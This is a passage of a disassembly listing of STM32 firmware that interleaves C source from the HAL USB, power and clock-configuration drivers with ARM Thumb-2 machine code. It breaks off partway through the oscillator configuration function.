 80034ee:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034f2:	095b      	lsrs	r3, r3, #5
 80034f4:	66bb      	str	r3, [r7, #104]	; 0x68
 80034f6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034fa:	f003 031f 	and.w	r3, r3, #31
 80034fe:	2b00      	cmp	r3, #0
 8003500:	d102      	bne.n	8003508 <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003502:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003504:	3b01      	subs	r3, #1
 8003506:	66bb      	str	r3, [r7, #104]	; 0x68
 8003508:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800350a:	881b      	ldrh	r3, [r3, #0]
 800350c:	b29a      	uxth	r2, r3
 800350e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003510:	b29b      	uxth	r3, r3
 8003512:	029b      	lsls	r3, r3, #10
 8003514:	b29b      	uxth	r3, r3
 8003516:	4313      	orrs	r3, r2
 8003518:	b29b      	uxth	r3, r3
 800351a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800351e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003522:	b29a      	uxth	r2, r3
 8003524:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003526:	801a      	strh	r2, [r3, #0]
 8003528:	e041      	b.n	80035ae <HAL_PCD_EP_DB_Transmit+0x77c>
 800352a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800352e:	2b00      	cmp	r3, #0
 8003530:	d10a      	bne.n	8003548 <HAL_PCD_EP_DB_Transmit+0x716>
 8003532:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003534:	881b      	ldrh	r3, [r3, #0]
 8003536:	b29b      	uxth	r3, r3
 8003538:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800353c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003540:	b29a      	uxth	r2, r3
 8003542:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003544:	801a      	strh	r2, [r3, #0]
 8003546:	e032      	b.n	80035ae <HAL_PCD_EP_DB_Transmit+0x77c>
 8003548:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800354c:	085b      	lsrs	r3, r3, #1
 800354e:	66bb      	str	r3, [r7, #104]	; 0x68
 8003550:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003554:	f003 0301 	and.w	r3, r3, #1
 8003558:	2b00      	cmp	r3, #0
 800355a:	d002      	beq.n	8003562 <HAL_PCD_EP_DB_Transmit+0x730>
 800355c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800355e:	3301      	adds	r3, #1
 8003560:	66bb      	str	r3, [r7, #104]	; 0x68
 8003562:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003564:	881b      	ldrh	r3, [r3, #0]
 8003566:	b29a      	uxth	r2, r3
 8003568:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800356a:	b29b      	uxth	r3, r3
 800356c:	029b      	lsls	r3, r3, #10
 800356e:	b29b      	uxth	r3, r3
 8003570:	4313      	orrs	r3, r2
 8003572:	b29a      	uxth	r2, r3
 8003574:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003576:	801a      	strh	r2, [r3, #0]
 8003578:	e019      	b.n	80035ae <HAL_PCD_EP_DB_Transmit+0x77c>
 800357a:	68bb      	ldr	r3, [r7, #8]
 800357c:	785b      	ldrb	r3, [r3, #1]
 800357e:	2b01      	cmp	r3, #1
 8003580:	d115      	bne.n	80035ae <HAL_PCD_EP_DB_Transmit+0x77c>
 8003582:	68fb      	ldr	r3, [r7, #12]
 8003584:	681b      	ldr	r3, [r3, #0]
 8003586:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800358a:	b29b      	uxth	r3, r3
 800358c:	461a      	mov	r2, r3
 800358e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003590:	4413      	add	r3, r2
 8003592:	657b      	str	r3, [r7, #84]	; 0x54
 8003594:	68bb      	ldr	r3, [r7, #8]
 8003596:	781b      	ldrb	r3, [r3, #0]
 8003598:	00da      	lsls	r2, r3, #3
 800359a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800359c:	4413      	add	r3, r2
 800359e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80035a2:	653b      	str	r3, [r7, #80]	; 0x50
 80035a4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035a8:	b29a      	uxth	r2, r3
 80035aa:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80035ac:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 80035ae:	68fb      	ldr	r3, [r7, #12]
 80035b0:	6818      	ldr	r0, [r3, #0]
 80035b2:	68bb      	ldr	r3, [r7, #8]
 80035b4:	6959      	ldr	r1, [r3, #20]
 80035b6:	68bb      	ldr	r3, [r7, #8]
 80035b8:	895a      	ldrh	r2, [r3, #10]
 80035ba:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035be:	b29b      	uxth	r3, r3
 80035c0:	f004 fee7 	bl	8008392 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 80035c4:	68fb      	ldr	r3, [r7, #12]
 80035c6:	681b      	ldr	r3, [r3, #0]
 80035c8:	461a      	mov	r2, r3
 80035ca:	68bb      	ldr	r3, [r7, #8]
 80035cc:	781b      	ldrb	r3, [r3, #0]
 80035ce:	009b      	lsls	r3, r3, #2
 80035d0:	4413      	add	r3, r2
 80035d2:	881b      	ldrh	r3, [r3, #0]
 80035d4:	b29b      	uxth	r3, r3
 80035d6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80035da:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80035de:	82bb      	strh	r3, [r7, #20]
 80035e0:	8abb      	ldrh	r3, [r7, #20]
 80035e2:	f083 0310 	eor.w	r3, r3, #16
 80035e6:	82bb      	strh	r3, [r7, #20]
 80035e8:	8abb      	ldrh	r3, [r7, #20]
 80035ea:	f083 0320 	eor.w	r3, r3, #32
 80035ee:	82bb      	strh	r3, [r7, #20]
 80035f0:	68fb      	ldr	r3, [r7, #12]
 80035f2:	681b      	ldr	r3, [r3, #0]
 80035f4:	461a      	mov	r2, r3
 80035f6:	68bb      	ldr	r3, [r7, #8]
 80035f8:	781b      	ldrb	r3, [r3, #0]
 80035fa:	009b      	lsls	r3, r3, #2
 80035fc:	441a      	add	r2, r3
 80035fe:	8abb      	ldrh	r3, [r7, #20]
 8003600:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003604:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003608:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800360c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003610:	b29b      	uxth	r3, r3
 8003612:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003614:	2300      	movs	r3, #0
}
 8003616:	4618      	mov	r0, r3
 8003618:	3790      	adds	r7, #144	; 0x90
 800361a:	46bd      	mov	sp, r7
 800361c:	bd80      	pop	{r7, pc}

0800361e <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 800361e:	b480      	push	{r7}
 8003620:	b087      	sub	sp, #28
 8003622:	af00      	add	r7, sp, #0
 8003624:	60f8      	str	r0, [r7, #12]
 8003626:	607b      	str	r3, [r7, #4]
 8003628:	460b      	mov	r3, r1
 800362a:	817b      	strh	r3, [r7, #10]
 800362c:	4613      	mov	r3, r2
 800362e:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 8003630:	897b      	ldrh	r3, [r7, #10]
 8003632:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8003636:	b29b      	uxth	r3, r3
 8003638:	2b00      	cmp	r3, #0
 800363a:	d00b      	beq.n	8003654 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800363c:	897b      	ldrh	r3, [r7, #10]
 800363e:	f003 0307 	and.w	r3, r3, #7
 8003642:	1c5a      	adds	r2, r3, #1
 8003644:	4613      	mov	r3, r2
 8003646:	009b      	lsls	r3, r3, #2
 8003648:	4413      	add	r3, r2
 800364a:	00db      	lsls	r3, r3, #3
 800364c:	68fa      	ldr	r2, [r7, #12]
 800364e:	4413      	add	r3, r2
 8003650:	617b      	str	r3, [r7, #20]
 8003652:	e009      	b.n	8003668 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003654:	897a      	ldrh	r2, [r7, #10]
 8003656:	4613      	mov	r3, r2
 8003658:	009b      	lsls	r3, r3, #2
 800365a:	4413      	add	r3, r2
 800365c:	00db      	lsls	r3, r3, #3
 800365e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8003662:	68fa      	ldr	r2, [r7, #12]
 8003664:	4413      	add	r3, r2
 8003666:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003668:	893b      	ldrh	r3, [r7, #8]
 800366a:	2b00      	cmp	r3, #0
 800366c:	d107      	bne.n	800367e <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 800366e:	697b      	ldr	r3, [r7, #20]
 8003670:	2200      	movs	r2, #0
 8003672:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003674:	687b      	ldr	r3, [r7, #4]
 8003676:	b29a      	uxth	r2, r3
 8003678:	697b      	ldr	r3, [r7, #20]
 800367a:	80da      	strh	r2, [r3, #6]
 800367c:	e00b      	b.n	8003696 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800367e:	697b      	ldr	r3, [r7, #20]
 8003680:	2201      	movs	r2, #1
 8003682:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003684:	687b      	ldr	r3, [r7, #4]
 8003686:	b29a      	uxth	r2, r3
 8003688:	697b      	ldr	r3, [r7, #20]
 800368a:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 800368c:	687b      	ldr	r3, [r7, #4]
 800368e:	0c1b      	lsrs	r3, r3, #16
 8003690:	b29a      	uxth	r2, r3
 8003692:	697b      	ldr	r3, [r7, #20]
 8003694:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8003696:	2300      	movs	r3, #0
}
 8003698:	4618      	mov	r0, r3
 800369a:	371c      	adds	r7, #28
 800369c:	46bd      	mov	sp, r7
 800369e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80036a2:	4770      	bx	lr

080036a4 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 80036a4:	b480      	push	{r7}
 80036a6:	b085      	sub	sp, #20
 80036a8:	af00      	add	r7, sp, #0
 80036aa:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 80036ac:	687b      	ldr	r3, [r7, #4]
 80036ae:	681b      	ldr	r3, [r3, #0]
 80036b0:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 80036b2:	687b      	ldr	r3, [r7, #4]
 80036b4:	2201      	movs	r2, #1
 80036b6:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 80036ba:	687b      	ldr	r3, [r7, #4]
 80036bc:	2200      	movs	r2, #0
 80036be:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 80036c2:	68fb      	ldr	r3, [r7, #12]
 80036c4:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80036c8:	b29b      	uxth	r3, r3
 80036ca:	f043 0301 	orr.w	r3, r3, #1
 80036ce:	b29a      	uxth	r2, r3
 80036d0:	68fb      	ldr	r3, [r7, #12]
 80036d2:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 80036d6:	68fb      	ldr	r3, [r7, #12]
 80036d8:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80036dc:	b29b      	uxth	r3, r3
 80036de:	f043 0302 	orr.w	r3, r3, #2
 80036e2:	b29a      	uxth	r2, r3
 80036e4:	68fb      	ldr	r3, [r7, #12]
 80036e6:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 80036ea:	2300      	movs	r3, #0
}
 80036ec:	4618      	mov	r0, r3
 80036ee:	3714      	adds	r7, #20
 80036f0:	46bd      	mov	sp, r7
 80036f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80036f6:	4770      	bx	lr

080036f8 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 80036f8:	b480      	push	{r7}
 80036fa:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80036fc:	4b05      	ldr	r3, [pc, #20]	; (8003714 <HAL_PWR_EnableBkUpAccess+0x1c>)
 80036fe:	681b      	ldr	r3, [r3, #0]
 8003700:	4a04      	ldr	r2, [pc, #16]	; (8003714 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003702:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003706:	6013      	str	r3, [r2, #0]
}
 8003708:	bf00      	nop
 800370a:	46bd      	mov	sp, r7
 800370c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003710:	4770      	bx	lr
 8003712:	bf00      	nop
 8003714:	40007000 	.word	0x40007000

08003718 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 8003718:	b480      	push	{r7}
 800371a:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 800371c:	4b04      	ldr	r3, [pc, #16]	; (8003730 <HAL_PWREx_GetVoltageRange+0x18>)
 800371e:	681b      	ldr	r3, [r3, #0]
 8003720:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 8003724:	4618      	mov	r0, r3
 8003726:	46bd      	mov	sp, r7
 8003728:	f85d 7b04 	ldr.w	r7, [sp], #4
 800372c:	4770      	bx	lr
 800372e:	bf00      	nop
 8003730:	40007000 	.word	0x40007000

08003734 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 8003734:	b480      	push	{r7}
 8003736:	b085      	sub	sp, #20
 8003738:	af00      	add	r7, sp, #0
 800373a:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 800373c:	687b      	ldr	r3, [r7, #4]
 800373e:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003742:	d130      	bne.n	80037a6 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 8003744:	4b23      	ldr	r3, [pc, #140]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003746:	681b      	ldr	r3, [r3, #0]
 8003748:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 800374c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003750:	d038      	beq.n	80037c4 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 8003752:	4b20      	ldr	r3, [pc, #128]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003754:	681b      	ldr	r3, [r3, #0]
 8003756:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 800375a:	4a1e      	ldr	r2, [pc, #120]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800375c:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8003760:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 8003762:	4b1d      	ldr	r3, [pc, #116]	; (80037d8 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003764:	681b      	ldr	r3, [r3, #0]
 8003766:	2232      	movs	r2, #50	; 0x32
 8003768:	fb02 f303 	mul.w	r3, r2, r3
 800376c:	4a1b      	ldr	r2, [pc, #108]	; (80037dc <HAL_PWREx_ControlVoltageScaling+0xa8>)
 800376e:	fba2 2303 	umull	r2, r3, r2, r3
 8003772:	0c9b      	lsrs	r3, r3, #18
 8003774:	3301      	adds	r3, #1
 8003776:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003778:	e002      	b.n	8003780 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 800377a:	68fb      	ldr	r3, [r7, #12]
 800377c:	3b01      	subs	r3, #1
 800377e:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003780:	4b14      	ldr	r3, [pc, #80]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003782:	695b      	ldr	r3, [r3, #20]
 8003784:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003788:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800378c:	d102      	bne.n	8003794 <HAL_PWREx_ControlVoltageScaling+0x60>
 800378e:	68fb      	ldr	r3, [r7, #12]
 8003790:	2b00      	cmp	r3, #0
 8003792:	d1f2      	bne.n	800377a <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003794:	4b0f      	ldr	r3, [pc, #60]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003796:	695b      	ldr	r3, [r3, #20]
 8003798:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800379c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80037a0:	d110      	bne.n	80037c4 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 80037a2:	2303      	movs	r3, #3
 80037a4:	e00f      	b.n	80037c6 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 80037a6:	4b0b      	ldr	r3, [pc, #44]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037a8:	681b      	ldr	r3, [r3, #0]
 80037aa:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80037ae:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80037b2:	d007      	beq.n	80037c4 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 80037b4:	4b07      	ldr	r3, [pc, #28]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037b6:	681b      	ldr	r3, [r3, #0]
 80037b8:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80037bc:	4a05      	ldr	r2, [pc, #20]	; (80037d4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037be:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80037c2:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 80037c4:	2300      	movs	r3, #0
}
 80037c6:	4618      	mov	r0, r3
 80037c8:	3714      	adds	r7, #20
 80037ca:	46bd      	mov	sp, r7
 80037cc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037d0:	4770      	bx	lr
 80037d2:	bf00      	nop
 80037d4:	40007000 	.word	0x40007000
 80037d8:	20000000 	.word	0x20000000
 80037dc:	431bde83 	.word	0x431bde83

080037e0 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 80037e0:	b480      	push	{r7}
 80037e2:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 80037e4:	4b05      	ldr	r3, [pc, #20]	; (80037fc <HAL_PWREx_EnableVddUSB+0x1c>)
 80037e6:	685b      	ldr	r3, [r3, #4]
 80037e8:	4a04      	ldr	r2, [pc, #16]	; (80037fc <HAL_PWREx_EnableVddUSB+0x1c>)
 80037ea:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80037ee:	6053      	str	r3, [r2, #4]
}
 80037f0:	bf00      	nop
 80037f2:	46bd      	mov	sp, r7
 80037f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037f8:	4770      	bx	lr
 80037fa:	bf00      	nop
 80037fc:	40007000 	.word	0x40007000

08003800 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003800:	b580      	push	{r7, lr}
 8003802:	b088      	sub	sp, #32
 8003804:	af00      	add	r7, sp, #0
 8003806:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003808:	687b      	ldr	r3, [r7, #4]
 800380a:	2b00      	cmp	r3, #0
 800380c:	d102      	bne.n	8003814 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 800380e:	2301      	movs	r3, #1
 8003810:	f000 bc02 	b.w	8004018 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003814:	4b96      	ldr	r3, [pc, #600]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003816:	689b      	ldr	r3, [r3, #8]
 8003818:	f003 030c 	and.w	r3, r3, #12
 800381c:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 800381e:	4b94      	ldr	r3, [pc, #592]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003820:	68db      	ldr	r3, [r3, #12]
 8003822:	f003 0303 	and.w	r3, r3, #3
 8003826:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003828:	687b      	ldr	r3, [r7, #4]
 800382a:	681b      	ldr	r3, [r3, #0]
 800382c:	f003 0310 	and.w	r3, r3, #16
 8003830:	2b00      	cmp	r3, #0
 8003832:	f000 80e4 	beq.w	80039fe <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003836:	69bb      	ldr	r3, [r7, #24]
 8003838:	2b00      	cmp	r3, #0
 800383a:	d007      	beq.n	800384c <HAL_RCC_OscConfig+0x4c>
 800383c:	69bb      	ldr	r3, [r7, #24]
 800383e:	2b0c      	cmp	r3, #12
 8003840:	f040 808b 	bne.w	800395a <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003844:	697b      	ldr	r3, [r7, #20]
 8003846:	2b01      	cmp	r3, #1
 8003848:	f040 8087 	bne.w	800395a <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 800384c:	4b88      	ldr	r3, [pc, #544]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 800384e:	681b      	ldr	r3, [r3, #0]
 8003850:	f003 0302 	and.w	r3, r3, #2
 8003854:	2b00      	cmp	r3, #0
 8003856:	d005      	beq.n	8003864 <HAL_RCC_OscConfig+0x64>
 8003858:	687b      	ldr	r3, [r7, #4]
 800385a:	699b      	ldr	r3, [r3, #24]
 800385c:	2b00      	cmp	r3, #0
 800385e:	d101      	bne.n	8003864 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003860:	2301      	movs	r3, #1
 8003862:	e3d9      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003864:	687b      	ldr	r3, [r7, #4]
 8003866:	6a1a      	ldr	r2, [r3, #32]
 8003868:	4b81      	ldr	r3, [pc, #516]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 800386a:	681b      	ldr	r3, [r3, #0]
 800386c:	f003 0308 	and.w	r3, r3, #8
 8003870:	2b00      	cmp	r3, #0
 8003872:	d004      	beq.n	800387e <HAL_RCC_OscConfig+0x7e>
 8003874:	4b7e      	ldr	r3, [pc, #504]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003876:	681b      	ldr	r3, [r3, #0]
 8003878:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800387c:	e005      	b.n	800388a <HAL_RCC_OscConfig+0x8a>
 800387e:	4b7c      	ldr	r3, [pc, #496]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003880:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003884:	091b      	lsrs	r3, r3, #4
 8003886:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800388a:	4293      	cmp	r3, r2
 800388c:	d223      	bcs.n	80038d6 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800388e:	687b      	ldr	r3, [r7, #4]
 8003890:	6a1b      	ldr	r3, [r3, #32]
 8003892:	4618      	mov	r0, r3
 8003894:	f000 fd8c 	bl	80043b0 <RCC_SetFlashLatencyFromMSIRange>
 8003898:	4603      	mov	r3, r0
 800389a:	2b00      	cmp	r3, #0
 800389c:	d001      	beq.n	80038a2 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 800389e:	2301      	movs	r3, #1
 80038a0:	e3ba      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80038a2:	4b73      	ldr	r3, [pc, #460]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038a4:	681b      	ldr	r3, [r3, #0]
 80038a6:	4a72      	ldr	r2, [pc, #456]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038a8:	f043 0308 	orr.w	r3, r3, #8
 80038ac:	6013      	str	r3, [r2, #0]
 80038ae:	4b70      	ldr	r3, [pc, #448]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038b0:	681b      	ldr	r3, [r3, #0]
 80038b2:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80038b6:	687b      	ldr	r3, [r7, #4]
